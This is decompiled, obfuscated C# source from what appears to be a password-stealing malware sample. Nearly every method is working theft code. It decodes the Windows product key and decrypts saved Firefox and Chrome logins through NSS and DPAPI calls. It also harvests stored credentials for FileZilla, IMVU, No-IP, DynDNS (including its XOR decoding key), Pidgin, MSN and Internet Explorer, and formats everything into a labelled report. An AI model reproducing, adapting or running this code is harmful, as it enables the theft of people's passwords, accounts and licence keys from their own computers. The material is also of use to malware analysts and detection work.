using System;
using System.Collections;
using System.Data;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ddnNmUR7d6rtDN0EjMLeG5;
using tWeMYnM0Rsm7mjGOp8yVg0;

public class RQ2mVLX5V3Xvdi49
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long GDelegate0(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long GDelegate1(string configdir);

	public class bjGYztlTXeqM4J50
	{
		public static long cb;

		public static byte[] abID;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int fFDknYBNoBhwc055(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long ftvK1vT4VnT7Ck53();

	public struct LervF9NQgTli1651
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int LLVAiKMb8BUv0Y56(ref LervF9NQgTli1651 data, ref LervF9NQgTli1651 result, int cx);

	[Flags]
	public enum nTFSRYPfJzJEJe57
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct o1ZV2NujGuQS8358
	{
		public int cbSize;

		public nTFSRYPfJzJEJe57 dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct w2pSXDpuVoEebw59
	{
		public int cbData;

		public IntPtr pbData;
	}

	private QzkCGb95lx18 Lo31oXmg8FKqP7181;

	private static IntPtr NSS3;

	public static string signon;

	private Class0 JcHVx6eEimSzgq182;

	public RQ2mVLX5V3Xvdi49()
	{
		Lo31oXmg8FKqP7181 = new QzkCGb95lx18();
		JcHVx6eEimSzgq182 = new Class0();
	}

	public string wOHLVrCQNz1xPB217()
	{
		string text = "";
		string text2 = null;
		checked
		{
			try
			{
				byte[] sourceArray = (byte[])((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", writable: false)!.GetValue("DigitalProductId");
				byte[] array = new byte[15];
				Array.Copy(sourceArray, 52, array, 0, 15);
				string text3 = "BCDFGHJKMPQRTVWXY2346789";
				int num = 0;
				do
				{
					short num2 = 0;
					int num3 = 14;
					do
					{
						num2 = (short)((num2 * 256) ^ array[num3]);
						array[num3] = (byte)Math.Round(Conversion.Int((double)num2 / 24.0));
						num2 = (short)unchecked(num2 % 24);
						num3 += -1;
					}
					while (num3 >= 0);
					text = text3.Substring(num2, 1) + text;
					num++;
				}
				while (num <= 24);
				int num4 = 4;
				do
				{
					text = text.Insert(num4 * 5, "-");
					num4 += -1;
				}
				while (num4 >= 1);
				text2 = text2 + text + "\r\n";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text2, (string)null, false) != 0)
			{
				text2 = "--------------------------------------------------------------------------------------\r\n[ Windows Key ]\r\n--------------------------------------------------------------------------------------\r\n" + text2 + "\r\n";
			}
			return text2;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static long smethod_0(string configdir)
	{
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\mozcrt19.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nspr4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plc4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\plds4.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\ssutil3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\sqlite3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nssutil3.dll");
		LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\softokn3.dll");
		NSS3 = LoadLibrary(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\nss3.dll");
		IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
		GDelegate1 gDelegate = (GDelegate1)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(GDelegate1));
		return gDelegate(configdir);
	}

	public static long sDNk7FHCoG0NxI221()
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
		ftvK1vT4VnT7Ck53 ftvK1vT4VnT7Ck = (ftvK1vT4VnT7Ck53)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ftvK1vT4VnT7Ck53));
		return ftvK1vT4VnT7Ck();
	}

	public static long HpMu6eMSIzEXpi222(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
		GDelegate0 gDelegate = (GDelegate0)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(GDelegate0));
		return gDelegate(slot, loadCerts, wincx);
	}

	public static int cGtYYmmKRl1Ujq223(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
		fFDknYBNoBhwc055 fFDknYBNoBhwc = (fFDknYBNoBhwc055)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(fFDknYBNoBhwc055));
		return fFDknYBNoBhwc(arenaOpt, outItemOpt, inStr, inLen);
	}

	public static int smethod_1(ref LervF9NQgTli1651 data, ref LervF9NQgTli1651 result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
		LLVAiKMb8BUv0Y56 lLVAiKMb8BUv0Y = (LLVAiKMb8BUv0Y56)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(LLVAiKMb8BUv0Y56));
		return lLVAiKMb8BUv0Y(ref data, ref result, cx);
	}

	public string UdF9fppHd2OamX225()
	{
		string text = null;
		checked
		{
			try
			{
				bool flag = false;
				long num = 0L;
				string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
				string[] array = directories;
				foreach (string text2 in array)
				{
					if (flag)
					{
						break;
					}
					string[] files = Directory.GetFiles(text2);
					string[] array2 = files;
					foreach (string input in array2)
					{
						if (flag)
						{
							break;
						}
						if (Regex.IsMatch(input, "signons.sqlite"))
						{
							smethod_0(text2);
							signon = input;
						}
					}
				}
				string baseName = signon;
				LervF9NQgTli1651 lervF9NQgTli = default(LervF9NQgTli1651);
				LervF9NQgTli1651 result = default(LervF9NQgTli1651);
				LervF9NQgTli1651 result2 = default(LervF9NQgTli1651);
				GClass0 gClass = new GClass0(baseName);
				DataTable dataTable = gClass.lvWXhCpxd30ZSR4JzA4pv262("SELECT * FROM moz_logins;");
				num = sDNk7FHCoG0NxI221();
				HpMu6eMSIzEXpi222(num, loadCerts: true, 0L);
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					LervF9NQgTli1651 lervF9NQgTli2 = default(LervF9NQgTli1651);
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow["formSubmitURL"].ToString());
						text = text + "URL: " + text3 + "\r\n";
						StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
						int value = cGtYYmmKRl1Ujq223(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
						IntPtr ptr = new IntPtr(value);
						object? obj = Marshal.PtrToStructure(ptr, typeof(LervF9NQgTli1651));
						LervF9NQgTli1651 data = ((obj != null) ? ((LervF9NQgTli1651)obj) : lervF9NQgTli2);
						if (smethod_1(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
						{
							byte[] array3 = new byte[result.SECItemLen - 1 + 1];
							ptr = new IntPtr(result.SECItemData);
							Marshal.Copy(ptr, array3, 0, result.SECItemLen);
							text = text + "USER: " + Encoding.ASCII.GetString(array3) + "\r\n";
						}
						StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
						int value2 = cGtYYmmKRl1Ujq223(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
						ptr = new IntPtr(value2);
						object? obj2 = Marshal.PtrToStructure(ptr, typeof(LervF9NQgTli1651));
						LervF9NQgTli1651 data2 = ((obj2 != null) ? ((LervF9NQgTli1651)obj2) : lervF9NQgTli2);
						if (smethod_1(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
						{
							byte[] array3 = new byte[result2.SECItemLen - 1 + 1];
							ptr = new IntPtr(result2.SECItemData);
							Marshal.Copy(ptr, array3, 0, result2.SECItemLen);
							text = text + "PASSWORD: " + Encoding.ASCII.GetString(array3) + "\r\n";
						}
						text += "\r\n";
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				text += "\r\n";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				text = "--------------------------------------------------------------------------------------\r\n[ FireFox 3.5+ ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
			}
			return text;
		}
	}

	public string yqtbUlN5cv8BaE226()
	{
		string text = null;
		try
		{
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
			if (File.Exists(text2))
			{
				GClass0 gClass = new GClass0(text2);
				DataTable dataTable = gClass.lvWXhCpxd30ZSR4JzA4pv262("SELECT * FROM logins;");
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = dataTable.Rows.GetEnumerator();
					while (enumerator.MoveNext())
					{
						DataRow dataRow = (DataRow)enumerator.Current;
						string text3 = Convert.ToString(dataRow["origin_url"].ToString());
						string text4 = Convert.ToString(dataRow["username_value"].ToString());
						string text5 = qklEsaZhTgUANP228((byte[])dataRow["password_value"]);
						if ((Operators.CompareString(text4, "", false) != 0) & (Operators.CompareString(text5, "", false) != 0))
						{
							string text6 = "Host: " + text3 + "\r\nUser: " + text4 + "\r\nPassword: " + text5 + "\r\n\r\n";
							text += text6;
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Chrome ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref w2pSXDpuVoEebw59 pDataIn, string szDataDescr, ref w2pSXDpuVoEebw59 pOptionalEntropy, IntPtr pvReserved, ref o1ZV2NujGuQS8358 pPromptStruct, int dwFlags, ref w2pSXDpuVoEebw59 pDataOut);

	public static string qklEsaZhTgUANP228(byte[] Datas)
	{
		w2pSXDpuVoEebw59 pDataIn = default(w2pSXDpuVoEebw59);
		w2pSXDpuVoEebw59 pDataOut = default(w2pSXDpuVoEebw59);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		w2pSXDpuVoEebw59 w2pSXDpuVoEebw = default(w2pSXDpuVoEebw59);
		w2pSXDpuVoEebw59 pOptionalEntropy = w2pSXDpuVoEebw;
		o1ZV2NujGuQS8358 o1ZV2NujGuQS = default(o1ZV2NujGuQS8358);
		o1ZV2NujGuQS8358 pPromptStruct = o1ZV2NujGuQS;
		IntPtr pvReserved = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	public string method_0()
	{
		string text = null;
		try
		{
			string text2 = ((ServerComputer)qn722tTmcUSru2.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml");
			string[] array = text2.Split(new char[1] { '\r' });
			string[] array2 = array;
			foreach (string text3 in array2)
			{
				if (text3.Contains("<Host>"))
				{
					text = text + "Host: " + text3.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<Port>"))
				{
					text = text + ":" + text3.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<User>"))
				{
					text = text + "User: " + text3.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text3.Contains("<Pass>"))
				{
					text = text + "Pass: " + text3.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
				}
			}
			text += "\r\n";
			text2 = ((ServerComputer)qn722tTmcUSru2.Computer).get_FileSystem().ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
			array = text2.Split(new char[1] { '\r' });
			string[] array3 = array;
			foreach (string text4 in array3)
			{
				if (text4.Contains("<Host>"))
				{
					text = text + "Host: " + text4.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<Port>"))
				{
					text = text + ":" + text4.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<User>"))
				{
					text = text + "User: " + text4.Replace("<User>", "").Replace("</User>", "").Replace("            ", "") + Environment.NewLine;
				}
				if (text4.Contains("<Pass>"))
				{
					text = text + "Pass: " + text4.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + Environment.NewLine + Environment.NewLine;
				}
			}
			text += "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ FileZilla ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string KBw0krES9t8ZEH230()
	{
		string text = null;
		try
		{
			string text2 = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "username", (object)null));
			string text3 = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\IMVU", "password", (object)null));
			if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
			{
				text = text + "\r\nUsername : " + text2 + "\r\nPassword : " + dgeQY0CvR0FgDj231(text3);
				text += "\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ IMVU ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string dgeQY0CvR0FgDj231(string Text)
	{
		try
		{
			object obj = null;
			object obj2 = default(object);
			object obj3 = default(object);
			if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
			{
				do
				{
					object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
					obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
					obj2 = Operators.AddObject(obj2, (object)1);
				}
				while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
			}
			return Conversions.ToString(obj);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string OFUR34whKUgma8232(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[checked(charCount - 1 + 1)];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_1()
	{
		string text = null;
		try
		{
			string text2 = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
			string text3 = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
			string text4 = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object)null));
			string data = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object)null));
			string text5 = Conversions.ToString(((ServerComputer)qn722tTmcUSru2.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object)null));
			string text6 = "\r\n";
			if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text3, "", false) != 0))
			{
				text = text + "Username: " + text2 + text6 + "Password: " + OFUR34whKUgma8232(text3) + text6 + "Proxy Username:" + text4 + text6 + "Proxy Password: " + OFUR34whKUgma8232(data) + text6 + "Proxy Port: " + text5 + text6 + text6;
				text += "\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ No IP ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string Kvl3Nl3uzhWAaV234()
	{
		string text = null;
		checked
		{
			try
			{
				string text2 = null;
				string text3 = null;
				string text4 = null;
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
				string text5 = folderPath + "\\DynDNS\\Updater\\config.dyndns";
				string text6 = ((ServerComputer)qn722tTmcUSru2.Computer).get_FileSystem().ReadAllText(text5);
				string[] array = text6.Split(new char[1] { '\r' });
				string[] array2 = array;
				foreach (string text7 in array2)
				{
					if (text7.Contains("Username="))
					{
						text2 = Strings.Mid(text7, 11);
					}
					else if (text7.Contains("Password="))
					{
						text3 = Strings.Mid(text7, 11);
					}
				}
				int num = Strings.Len(text3);
				for (int j = 1; j <= num; j += 2)
				{
					text4 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val("&H" + Strings.Mid(text3, j, 2)))));
				}
				int num2 = Strings.Len(text4);
				int num3 = default(int);
				for (int j = 1; j <= num2; j++)
				{
					StringType.MidStmtStr(ref text4, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text4, j, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num3 + 1, 1)))));
					unchecked
					{
						num3 = checked(num3 + 1) % 8;
					}
				}
				if ((Operators.CompareString(text2, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
				{
					text = text + "User: " + text2 + "\r\nPassword: " + text4 + "\r\n";
					text += "\r\n";
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				text = "--------------------------------------------------------------------------------------\r\n[ DynDNS ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
			}
			return text;
		}
	}

	public string vkABQtukvraBpy235()
	{
		string text = null;
		try
		{
			string text2 = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
			string text3 = Conversions.ToString(1);
			string text4 = "\r\n";
			text3 = ((ServerComputer)qn722tTmcUSru2.Computer).get_FileSystem().OpenTextFileReader(text2).ReadToEnd();
			string text5 = null;
			string[] array = text3.Split(new char[1] { '\r' });
			text3 = null;
			string[] array2 = array;
			foreach (string text6 in array2)
			{
				if (text6.Contains("<protocol>"))
				{
					text5 = text5 + "Protocol:" + text6 + text4;
				}
				if (text6.Contains("<name>"))
				{
					text5 = text5 + "Name:" + text6 + text4;
				}
				if (text6.Contains("<password>"))
				{
					text5 = text5 + "Password:" + text6 + text4 + text4;
				}
			}
			text += text5;
			text += "\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Pidgin ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string e1eXLhwfycyO4w236()
	{
		string text = null;
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Lo31oXmg8FKqP7181.GetEnumerator();
				while (enumerator.MoveNext())
				{
					uYJmCJsyAY17 uYJmCJsyAY18 = (uYJmCJsyAY17)enumerator.Current;
					text = text + "Login: " + uYJmCJsyAY18.Login + "\r\n";
					text = text + "Password: " + uYJmCJsyAY18.Password + "\r\n\r\n";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ MSN - Live Messenger ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string XeivRYJ7i1fPKq237()
	{
		string text = null;
		try
		{
			bool flag = false;
			string text2 = Conversions.ToString(1);
			string text3 = null;
			string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
			string[] array = directories;
			foreach (string path in array)
			{
				if (flag)
				{
					break;
				}
				string[] files = Directory.GetFiles(path);
				string[] array2 = files;
				foreach (string text4 in array2)
				{
					if (flag)
					{
						break;
					}
					if (Regex.IsMatch(text4, "signons3.txt"))
					{
						text3 = text4;
					}
				}
			}
			text2 = ((ServerComputer)qn722tTmcUSru2.Computer).get_FileSystem().OpenTextFileReader(text3).ReadToEnd();
			string[] array3 = text2.Split(new char[1] { '\r' });
			text2 = null;
			LervF9NQgTli1651 result = default(LervF9NQgTli1651);
			string[] array4 = array3;
			LervF9NQgTli1651 lervF9NQgTli = default(LervF9NQgTli1651);
			foreach (string text5 in array4)
			{
				if ((text5.Length != 0) & text5.StartsWith(".") & !text5.StartsWith("#"))
				{
					text += "\r\n";
				}
				else if (text5.StartsWith("http") | text5.Contains("//") | text5.Contains("ftp."))
				{
					text = text + "URL: " + text5 + "\r\n";
				}
				else if (text5.ToLower().Contains("username") | text5.ToLower().Contains("login") | text5.ToLower().Contains("email"))
				{
					text += "User: ";
				}
				else if (text5.Contains("*"))
				{
					text += "Password: ";
				}
				else if (text5.Contains("AAAAAAAAA"))
				{
					StringBuilder stringBuilder = new StringBuilder(text5);
					int value = cGtYYmmKRl1Ujq223(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
					IntPtr ptr = new IntPtr(value);
					object? obj = Marshal.PtrToStructure(ptr, typeof(LervF9NQgTli1651));
					LervF9NQgTli1651 data = ((obj != null) ? ((LervF9NQgTli1651)obj) : lervF9NQgTli);
					if (smethod_1(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
					{
						byte[] array5 = new byte[checked(result.SECItemLen - 1 + 1)];
						ptr = new IntPtr(result.SECItemData);
						Marshal.Copy(ptr, array5, 0, result.SECItemLen);
						text = text + Encoding.ASCII.GetString(array5) + "\r\n";
					}
				}
				else if (text5.Contains("---"))
				{
					text += "\r\n";
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ FireFox 2-3 ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}

	public string method_2()
	{
		string text = null;
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = JcHVx6eEimSzgq182.GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Password", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
					{
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "URL: "), NewLateBinding.LateGet(objectValue, (Type)null, "URL", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"));
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "Username: "), NewLateBinding.LateGet(objectValue, (Type)null, "UserName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"));
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "Password: "), NewLateBinding.LateGet(objectValue, (Type)null, "Password", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"\r\n"), (object)"\r\n"));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text, (string)null, false) != 0)
		{
			text = "--------------------------------------------------------------------------------------\r\n[ Internet Explorer 7-8 ]\r\n--------------------------------------------------------------------------------------\r\n" + text + "\r\n";
		}
		return text;
	}
}
